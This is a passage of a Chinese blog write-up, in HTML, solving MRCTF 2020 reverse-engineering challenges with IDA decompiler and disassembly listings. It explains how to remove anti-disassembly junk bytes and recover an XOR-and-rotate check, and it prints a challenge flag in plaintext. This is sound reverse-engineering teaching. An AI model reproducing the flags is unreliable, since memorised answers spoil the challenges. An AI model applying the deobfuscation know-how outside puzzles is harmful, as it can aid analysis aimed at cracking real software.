class="hljs-built_in">chr</span>(x)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><h4 id="PixelShooter"><a href="#PixelShooter" class="headerlink" title="PixelShooter"></a>PixelShooter</h4><p>游戏我是一点都不会打，直接解包找到<code>dll</code>在字符串视图可以直接看到<code>flag</code></p><h4 id="hello-world-go"><a href="#hello-world-go" class="headerlink" title="hello_world_go"></a>hello_world_go</h4><p>乱七八糟看了就觉得头疼的<code>go</code></p><p>找到主函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main_main</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v2; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v3; <span class="hljs-comment">// r9</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// r9</span></span><br><span class="line">  __int64 v6; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// r9</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v11; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 result; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="hljs-comment">// ST58_8</span></span><br><span class="line">  __int64 *v14; <span class="hljs-comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  __int64 *v16; <span class="hljs-comment">// [rsp+60h] [rbp-50h]</span></span><br><span class="line">  __int128 v17; <span class="hljs-comment">// [rsp+68h] [rbp-48h]</span></span><br><span class="line">  <span class="hljs-keyword">void</span> *v18; <span class="hljs-comment">// [rsp+78h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">void</span> **v19; <span class="hljs-comment">// [rsp+80h] [rbp-30h]</span></span><br><span class="line">  __int128 v20; <span class="hljs-comment">// [rsp+88h] [rbp-28h]</span></span><br><span class="line">  __int128 v21; <span class="hljs-comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)&amp;v19 &lt;= *(_QWORD *)(__readfsqword(<span class="hljs-number">0xFFFFFFF8</span>) + <span class="hljs-number">16</span>) )</span><br><span class="line">    <span class="hljs-built_in">runtime_morestack_noctxt</span>();</span><br><span class="line">  <span class="hljs-built_in">runtime_newobject</span>(a1, a2);</span><br><span class="line">  v16 = v14;</span><br><span class="line">  *(_QWORD *)&amp;v21 = &amp;unk_4AC9C0;</span><br><span class="line">  *((_QWORD *)&amp;v21 + <span class="hljs-number">1</span>) = &amp;off_4EA530;</span><br><span class="line">  <span class="hljs-built_in">fmt_Fprint</span>(a1, a2, (__int64)&amp;v21, (__int64)&amp;unk_4AC9C0, v2, v3, (__int64)&amp;off_4EBDA0, qword_577550);</span><br><span class="line">  *(_QWORD *)&amp;v20 = &amp;unk_4A96A0;</span><br><span class="line">  *((_QWORD *)&amp;v20 + <span class="hljs-number">1</span>) = v16;</span><br><span class="line">  <span class="hljs-built_in">fmt_Fscanf</span>(</span><br><span class="line">    a1,</span><br><span class="line">    a2,</span><br><span class="line">    (__int64)&amp;off_4EBD80,</span><br><span class="line">    (__int64)&amp;v20,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    (__int64)&amp;off_4EBD80,</span><br><span class="line">    qword_577548,</span><br><span class="line">    (__int64)&amp;unk_4D07C9,</span><br><span class="line">    <span class="hljs-number">2LL</span>);</span><br><span class="line">  v8 = v16[<span class="hljs-number">1</span>];</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v8 != <span class="hljs-number">24</span> )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_3;</span><br><span class="line">  v13 = *v16;</span><br><span class="line">  <span class="hljs-built_in">runtime_memequal</span>(a1, a2, v6, (<span class="hljs-keyword">unsigned</span> __int64)&amp;unk_4D3C58);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v15 )</span><br><span class="line">  {</span><br><span class="line">    v8 = <span class="hljs-number">24LL</span>;</span><br><span class="line">LABEL_3:</span><br><span class="line">    <span class="hljs-built_in">runtime_cmpstring</span>(a1, a2, (__int64)&amp;unk_4D3C58, v8, v7);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> __int64)&amp;v20 &gt;= <span class="hljs-number">0</span> )</span><br><span class="line">      v11 = <span class="hljs-number">1LL</span>;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      v11 = <span class="hljs-number">-1LL</span>;</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_5;</span><br><span class="line">  }</span><br><span class="line">  v11 = <span class="hljs-number">0LL</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v11 )</span><br><span class="line">  {</span><br><span class="line">    *(_QWORD *)&amp;v17 = &amp;unk_4AC9C0;</span><br><span class="line">    *((_QWORD *)&amp;v17 + <span class="hljs-number">1</span>) = &amp;off_4EA550;</span><br><span class="line">    result = <span class="hljs-built_in">fmt_Fprintln</span>(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v18 = &amp;unk_4AC9C0;</span><br><span class="line">    v19 = &amp;off_4EA540;</span><br><span class="line">    result = <span class="hljs-built_in">fmt_Fprintln</span>(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看到了输出提示语，然后输入，最后进行字符串比较，输出正误，没见到有什么特殊的处理，猜测直接<code>flag</code>明文比较，点进去，得到<code>flag</code></p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{hello_world_gogogo}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="junk"><a href="#junk" class="headerlink" title="junk"></a>junk</h4><p>这一题还像是一道正常难度的re……</p><p><img src="/2020/03/30/MRCTF-wp/junk-1.png" alt="junk-1"></p><p>看起来很正常的流程图，但是接下来就发现<code>F5</code>大法不好使了，猜测题目<code>junk</code>的意思应该是加了混淆，所以干脆直接看汇编</p><p>题目需要输入一个字符串并存储到了<code>0x4216A0</code>的位置，在<code>loc_401200</code>内进行判断，通过<code>eax</code>来判别是否正确，直接<code>call</code>一个位置说明在这个判断函数里动了很多手脚，进去看看</p><p><del>然后发现简直乱七八糟</del></p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:00401200 loc_401200:                             ; CODE XREF: sub_401390+1E↓p</span><br><span class="line">.text:00401200                 push    ebp</span><br><span class="line">.text:00401201                 mov     ebp, esp</span><br><span class="line">.text:00401203                 sub     esp, 3Ch</span><br><span class="line">.text:00401206                 push    ebx</span><br><span class="line">.text:00401207                 push    esi</span><br><span class="line">.text:00401208                 push    edi</span><br><span class="line">.text:00401209                 mov     eax, [ebp+4]</span><br><span class="line">.text:0040120C                 sub     esp, 0E9h</span><br><span class="line">.text:00401212                 push    eax</span><br><span class="line">.text:00401213                 mov     dword ptr [ebp-8], offset unk_4216A0</span><br><span class="line">.text:0040121A                 mov     eax, [ebp-8]</span><br><span class="line">.text:0040121D                 add     eax, 1</span><br><span class="line">.text:00401220                 mov     [ebp-1Ch], eax</span><br><span class="line">.text:00401223</span><br><span class="line">.text:00401223 loc_401223:                             ; CODE XREF: .text:00401233↓j</span><br><span class="line">.text:00401223                 mov     ecx, [ebp-8]</span><br><span class="line">.text:00401226                 mov     dl, [ecx]</span><br><span class="line">.text:00401228                 mov     [ebp-1], dl</span><br><span class="line">.text:0040122B                 add     dword ptr [ebp-8], 1</span><br><span class="line">.text:0040122F                 cmp     byte ptr [ebp-1], 0</span><br><span class="line">.text:00401233                 jnz     short loc_401223</span><br><span class="line">.text:00401235                 mov     eax, [ebp-8]</span><br><span class="line">.text:00401238                 sub     eax, [ebp-1Ch]</span><br><span class="line">.text:0040123B                 mov     [ebp-20h], eax</span><br><span class="line">.text:0040123E                 mov     ecx, [ebp-20h]</span><br><span class="line">.text:00401241                 mov     [ebp-24h], ecx</span><br><span class="line">.text:00401244                 cmp     dword ptr [ebp-24h], 2Bh</span><br><span class="line">.text:00401248                 jz      short loc_401251</span><br><span class="line">.text:0040124A                 xor     al, al</span><br><span class="line">.text:0040124C                 jmp     loc_401387</span><br></pre></td></tr></tbody></table></figure><p>这段的意思实际上就是判断了一下字符串的长度为<code>0x2B</code>，然后进行了一个跳转，如果长度不为<code>0x2B</code>，跳转到结束部分，如果是，进行下一步的处理，然后发现下一步有个花指令</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">loc_401251:                             ; CODE XREF: .text:00401248↑j</span><br><span class="line">.text:00401251                 call    sub_401275</span><br><span class="line">.text:00401256                 call    near ptr 2BFF088Eh</span><br><span class="line">.text:00401256 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040125B                 db    0</span><br><span class="line">.text:0040125C                 db    0</span><br><span class="line">.text:0040125D                 db    0</span><br><span class="line">.text:0040125E                 db 33h</span><br><span class="line">.text:0040125F                 db 0C0h</span><br><span class="line">.text:00401260                 db 8Ah</span><br><span class="line">.text:00401261                 db  86h</span><br><span class="line">.text:00401262                 db  9Fh ; OFF32 SEGDEF [_data,42169F]</span><br><span class="line">.text:00401263                 db  16h</span><br><span class="line">.text:00401264                 db  42h ; B</span><br><span class="line">.text:00401265                 db    0</span><br><span class="line">.text:00401266                 db 34h</span><br><span class="line">.text:00401267                 db    3</span><br><span class="line">.text:00401268                 db 88h</span><br><span class="line">.text:00401269                 db  86h</span><br><span class="line">.text:0040126A                 db  9Fh ; OFF32 SEGDEF [_data,42169F]</span><br><span class="line">.text:0040126B                 db  16h</span><br><span class="line">.text:0040126C                 db  42h ; B</span><br><span class="line">.text:0040126D                 db    0</span><br><span class="line">.text:0040126E                 db 4Eh</span><br><span class="line">.text:0040126F                 db 85h</span><br><span class="line">.text:00401270                 db 0F6h</span><br><span class="line">.text:00401271                 db 75h</span><br><span class="line">.text:00401272                 db 0EBh</span><br><span class="line">.text:00401273                 db 0EBh</span><br></pre></td></tr></tbody></table></figure><p>开始变得乱七八糟，看一下<code>call</code>的函数内容</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub_401275      proc near               ; CODE XREF: .text:loc_401251↑p</span><br><span class="line">.text:00401275                 pop     eax</span><br><span class="line">.text:00401276                 add     eax, 1</span><br><span class="line">.text:00401279                 push    eax</span><br><span class="line">.text:0040127A                 retn</span><br><span class="line">.text:0040127A sub_401275      endp</span><br></pre></td></tr></tbody></table></figure><p>这就是个典型的花指令，首先<code>call</code>一个函数，相当于<code>push eip+jmp</code>，这个时候栈顶是<code>eip</code>就是函数执行结束之后需要返回的地址，但是进入这个函数之后发现，这个函数的作用就是把栈顶的<code>old eip</code>弹出到<code>eax</code>，然后<code>+1</code>，再<code>push</code>到栈顶，这使得最后返回的时候跳过了<code>call</code>命令紧接着的那个字节，所以手动去一下花，真正的指令应该是</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> xor     esi, esi</span><br><span class="line">.text:00401259                 mov     esi, 2Bh</span><br><span class="line">.text:0040125E</span><br><span class="line">.text:0040125E loc_40125E:                             ; CODE XREF: .text:00401271↓j</span><br><span class="line">.text:0040125E                 xor     eax, eax</span><br><span class="line">.text:00401260                 mov     al, byte ptr (dword_42169C+3)[esi]</span><br><span class="line">.text:00401266                 xor     al, 3</span><br><span class="line">.text:00401268                 mov     byte ptr (dword_42169C+3)[esi], al</span><br><span class="line">.text:0040126E                 dec     esi</span><br><span class="line">.text:0040126F                 test    esi, esi</span><br><span class="line">.text:00401271                 jnz     short loc_40125E</span><br><span class="line">.text:00401273                 jmp     short loc_40127B</span><br></pre></td></tr></tbody></table></figure><p>对于输入的字符每一个都和3异或得到了新的字符串，这里用的<code>al</code>取低八位实际上没有什么影响，因为输入的字符都在<code>0~255</code>之间，然后接下来还有一个跳转</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">loc_40127B:                             ; CODE XREF: .text:00401273↑j</span><br><span class="line">.text:0040127B                 xor     eax, eax</span><br><span class="line">.text:0040127D                 jz      short near ptr loc_40127F+1</span><br><span class="line">.text:0040127F</span><br><span class="line">.text:0040127F loc_40127F:                             ; CODE XREF: .text:0040127D↑j</span><br><span class="line">.text:0040127F                 call    near ptr 2BFF08B7h</span><br><span class="line">.text:0040127F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401284                 db    0</span><br><span class="line">.text:00401285                 db    0</span><br><span class="line">.text:00401286                 db    0</span><br><span class="line">.text:00401287                 db  33h ; 3</span><br><span class="line">.text:00401288                 db 0C0h, 8Ah, 86h</span><br><span class="line">.text:0040128B                 dd offset dword_42169C+3</span><br><span class="line">.text:0040128F                 db 8Bh</span><br><span class="line">.text:00401290                 dd 74DB33CEh, 0E183E801h, 0F98301h, 0C8C00574h, 0C003EB04h</span><br><span class="line">.text:00401290                 dd 868804C0h</span><br><span class="line">.text:004012A8                 dd offset dword_42169C+3</span><br><span class="line">.text:004012AC                 dd 75F6854Eh, 2BBAD6h</span><br><span class="line">.text:004012B4                 db 2 dup(0), 0B9h</span><br><span class="line">.text:004012B7                 dd offset unk_4216A0</span><br></pre></td></tr></tbody></table></figure><p>又是一个花指令，这个就比较明显，去花</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_401287:                             ; CODE XREF: .text:004012AF↓j</span><br><span class="line">.text:00401287                 xor     eax, eax</span><br><span class="line">.text:00401289                 mov     al, byte ptr (dword_42169C+3)[esi]</span><br><span class="line">.text:0040128F                 mov     ecx, esi</span><br><span class="line">.text:00401291                 xor     ebx, ebx</span><br><span class="line">.text:00401293                 jz      short near ptr loc_401295+1</span><br><span class="line">.text:00401295</span><br><span class="line">.text:00401295 loc_401295:                             ; CODE XREF: .text:00401293↑j</span><br><span class="line">.text:00401295                 call    near ptr 8341F41Dh</span><br><span class="line">.text:0040129A                 stc</span><br><span class="line">.text:0040129B                 add     [ebp+eax-40h], dh</span><br></pre></td></tr></tbody></table></figure><p>又是一个明显的花指令，接着去花，之后就没什么阻碍了</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">loc_40127B:                             ; CODE XREF: .text:00401273↑j</span><br><span class="line">.text:0040127B                 xor     eax, eax</span><br><span class="line">.text:0040127D                 jz      short loc_401280</span><br><span class="line">.text:0040127D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040127F                 db 0E8h</span><br><span class="line">.text:00401280 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401280</span><br><span class="line">.text:00401280 loc_401280:                             ; CODE XREF: .text:0040127D↑j</span><br><span class="line">.text:00401280                 xor     esi, esi</span><br><span class="line">.text:00401282                 mov     esi, 2Bh</span><br><span class="line">.text:00401287</span><br><span class="line">.text:00401287 loc_401287:                             ; CODE XREF: .text:004012AF↓j</span><br><span class="line">.text:00401287                 xor     eax, eax</span><br><span class="line">.text:00401289                 mov     al, byte ptr (dword_42169C+3)[esi]</span><br><span class="line">.text:0040128F                 mov     ecx, esi</span><br><span class="line">.text:00401291                 xor     ebx, ebx</span><br><span class="line">.text:00401293                 jz      short loc_401296</span><br><span class="line">.text:00401293 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401295                 db 0E8h</span><br><span class="line">.text:00401296 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401296</span><br><span class="line">.text:00401296 loc_401296:                             ; CODE XREF: .text:00401293↑j</span><br><span class="line">.text:00401296                 and     ecx, 1</span><br><span class="line">.text:00401299                 cmp     ecx, 0</span><br><span class="line">.text:0040129C                 jz      short loc_4012A3</span><br><span class="line">.text:0040129E                 ror     al, 4</span><br><span class="line">.text:004012A1                 jmp     short loc_4012A6</span><br><span class="line">.text:004012A3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004012A3</span><br><span class="line">.text:004012A3 loc_4012A3:                             ; CODE XREF: .text:0040129C↑j</span><br><span class="line">.text:004012A3                 rol     al, 4</span><br><span class="line">.text:004012A6</span><br><span class="line">.text:004012A6 loc_4012A6:                             ; CODE XREF: .text:004012A1↑j</span><br><span class="line">.text:004012A6                 mov     byte ptr (dword_42169C+3)[esi], al</span><br><span class="line">.text:004012AC                 dec     esi</span><br><span class="line">.text:004012AD                 test    esi, esi</span><br><span class="line">.text:004012AF                 jnz     short loc_401287</span><br><span class="line">.text:004012B1                 mov     edx, 2Bh</span><br><span class="line">.text:004012B6                 mov     ecx, offset unk_4216A0</span><br><span class="line">.text:004012BB                 call    sub_401090</span><br><span class="line">.text:004012C0                 mov     dword ptr [ebp-0Ch], offset byte_421708</span><br><span class="line">.text:004012C7                 mov     edx, [ebp-0Ch]</span><br><span class="line">.text:004012CA                 add     edx, 1</span><br><span class="line">.text:004012CD                 mov     [ebp-28h], edx</span><br><span class="line">.text:004012D0</span><br><span class="line">.text:004012D0 loc_4012D0:                             ; CODE XREF: .text:004012E0↓j</span><br><span class="line">.text:004012D0                 mov     eax, [ebp-0Ch]</span><br><span class="line">.text:004012D3                 mov     cl, [eax]</span><br><span class="line">.text:004012D5                 mov     [ebp-2], cl</span><br><span class="line">.text:004012D8                 add     dword ptr [ebp-0Ch], 1</span><br><span class="line">.text:004012DC                 cmp     byte ptr [ebp-2], 0</span><br><span class="line">.text:004012E0                 jnz     short loc_4012D0</span><br><span class="line">.text:004012E2                 mov     edx, [ebp-0Ch]</span><br><span class="line">.text:004012E5                 sub     edx, [ebp-28h]</span><br><span class="line">.text:004012E8                 mov     [ebp-30h], edx</span><br><span class="line">.text:004012EB                 mov     dword ptr [ebp-10h], offset aBuedvshlmfwhpz ; "%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a"...</span><br><span class="line">.text:004012F2                 mov     eax, [ebp-10h]</span><br><span class="line">.text:004012F5                 add     eax, 1</span><br><span class="line">.text:004012F8                 mov     [ebp-2Ch], eax</span><br><span class="line">.text:004012FB</span><br><span class="line">.text:004012FB loc_4012FB:                             ; CODE XREF: .text:0040130B↓j</span><br><span class="line">.text:004012FB                 mov     ecx, [ebp-10h]</span><br><span class="line">.text:004012FE                 mov     dl, [ecx]</span><br><span class="line">.text:00401300                 mov     [ebp-3], dl</span><br><span class="line">.text:00401303                 add     dword ptr [ebp-10h], 1</span><br><span class="line">.text:00401307                 cmp     byte ptr [ebp-3], 0</span><br><span class="line">.text:0040130B                 jnz     short loc_4012FB</span><br><span class="line">.text:0040130D                 mov     eax, [ebp-10h]</span><br><span class="line">.text:00401310                 sub     eax, [ebp-2Ch]</span><br><span class="line">.text:00401313                 mov     [ebp-34h], eax</span><br><span class="line">.text:00401316                 mov     ecx, [ebp-30h]</span><br><span class="line">.text:00401319                 cmp     ecx, [ebp-34h]</span><br><span class="line">.text:0040131C                 jz      short loc_401322</span><br><span class="line">.text:0040131E                 xor     al, al</span><br><span class="line">.text:00401320                 jmp     short loc_401387</span><br><span class="line">.text:00401322 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401322</span><br><span class="line">.text:00401322 loc_401322:                             ; CODE XREF: .text:0040131C↑j</span><br><span class="line">.text:00401322                 mov     dword ptr [ebp-18h], 0</span><br><span class="line">.text:00401329                 jmp     short loc_401334</span><br><span class="line">.text:0040132B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040132B</span><br><span class="line">.text:0040132B loc_40132B:                             ; CODE XREF: .text:loc_401383↓j</span><br><span class="line">.text:0040132B                 mov     edx, [ebp-18h]</span><br><span class="line">.text:0040132E                 add     edx, 1</span><br><span class="line">.text:00401331                 mov     [ebp-18h], edx</span><br><span class="line">.text:00401334</span><br><span class="line">.text:00401334 loc_401334:                             ; CODE XREF: .text:00401329↑j</span><br><span class="line">.text:00401334                 mov     dword ptr [ebp-14h], offset byte_421708</span><br><span class="line">.text:0040133B                 mov     eax, [ebp-14h]</span><br><span class="line">.text:0040133E                 add     eax, 1</span><br><span class="line">.text:00401341                 mov     [ebp-38h], eax</span><br><span class="line">.text:00401344</span><br><span class="line">.text:00401344 loc_401344:                             ; CODE XREF: .text:00401354↓j</span><br><span class="line">.text:00401344                 mov     ecx, [ebp-14h]</span><br><span class="line">.text:00401347                 mov     dl, [ecx]</span><br><span class="line">.text:00401349                 mov     [ebp-4], dl</span><br><span class="line">.text:0040134C                 add     dword ptr [ebp-14h], 1</span><br><span class="line">.text:00401350                 cmp     byte ptr [ebp-4], 0</span><br><span class="line">.text:00401354                 jnz     short loc_401344</span><br><span class="line">.text:00401356                 mov     eax, [ebp-14h]</span><br><span class="line">.text:00401359                 sub     eax, [ebp-38h]</span><br><span class="line">.text:0040135C                 mov     [ebp-3Ch], eax</span><br><span class="line">.text:0040135F                 mov     ecx, [ebp-18h]</span><br><span class="line">.text:00401362                 cmp     ecx, [ebp-3Ch]</span><br><span class="line">.text:00401365                 jnb     short loc_401385</span><br><span class="line">.text:00401367                 mov     edx, [ebp-18h]</span><br><span class="line">.text:0040136A                 movsx   eax, byte_421708[edx]</span><br><span class="line">.text:00401371                 mov     ecx, [ebp-18h]</span><br><span class="line">.text:00401374                 movsx   edx, byte ptr aBuedvshlmfwhpz[ecx] ; "%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a"...</span><br><span class="line">.text:0040137B                 cmp     eax, edx</span><br><span class="line">.text:0040137D                 jz      short loc_401383</span><br><span class="line">.text:0040137F                 xor     al, al</span><br><span class="line">.text:00401381                 jmp     short loc_401387</span><br><span class="line">.text:00401383 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401383</span><br><span class="line">.text:00401383 loc_401383:                             ; CODE XREF: 